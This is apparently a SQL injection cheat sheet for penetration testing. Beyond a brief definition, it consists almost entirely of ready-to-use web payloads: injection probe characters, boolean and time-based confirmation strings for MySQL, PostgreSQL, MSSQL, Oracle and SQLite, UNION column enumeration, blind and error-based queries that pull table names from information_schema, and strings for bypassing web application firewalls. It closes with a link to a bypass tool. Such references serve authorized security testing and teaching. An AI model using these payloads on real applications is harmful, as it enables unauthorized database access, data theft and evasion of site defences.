### **What is SQL injection?**
```
An SQL injection is a security flaw that allows attackers to interfere with database queries of an application.
This vulnerability can enable attackers to view, modify, or delete data they shouldn’t access, including information of other users or any data the application can access.
Such actions may result in permanent changes to the application’s functionality or content or even compromision of the server or denial of service.
```

### **Entry point detection**
```
 [Nothing]
'
"
`
')
")
`)
'))
"))
`))
```

### **Confirming with logical operations**
- To confirm the presence of an SQL Injection vulnerability, we test logical operations within the query and observe any changes in the response.
If the website returns the same content when using statements like or 1=1, it indicates the vulnerability, and if the result changes when using and 1=2, it confirms it.

```
page.asp?id=1 or 1=1 -- results in true
page.asp?id=1' or 1=1 -- results in true
page.asp?id=1" or 1=1 -- results in true
page.asp?id=1 and 1=2 -- results in false
```

### **Confirming with Timing**
```
MySQL (string concat and logical ops)
1' + sleep(10)
1' and sleep(10)
1' && sleep(10)
1' | sleep(10)

PostgreSQL (only support string concat)
1' || pg_sleep(10)

MSQL
1' WAITFOR DELAY '0:0:10'

Oracle
1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)

SQLite
1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```

### **Exploiting Union Based**
```
1' ORDER BY 1--+    #True
1' ORDER BY 2--+    #True
1' ORDER BY 3--+    #True
1' ORDER BY 4--+    #False - Query is only using 3 columns
                        #-1' UNION SELECT 1,2,3--+    True

1' GROUP BY 1--+    #True
1' GROUP BY 2--+    #True
1' GROUP BY 3--+    #True
1' GROUP BY 4--+    #False - Query is only using 3 columns
                        #-1' UNION SELECT 1,2,3--+    True
```

### **UNION SELECT**
```
1' UNION SELECT null-- - Not working
1' UNION SELECT null,null-- - Not working
1' UNION SELECT null,null,null-- - Worked
```

### **Exploiting Blind SQLi**
```
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'
```

### **Exploiting Error Blind SQLi**
```
AND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'))-- -
```

### **Exploiting Time Based SQLi**
```
1 and (select sleep(10) from users where SUBSTR(table_name,1,1) = 'A')#
```

### **WAF bypass**
```
-1' or 1.e(1) or '1'='1
-1' or 1337.1337e1 or '1'='1
' or 1.e('')=
```

### **WAF bypass suggester tools**
```
https://github.com/m4ll0k/Atlas
```





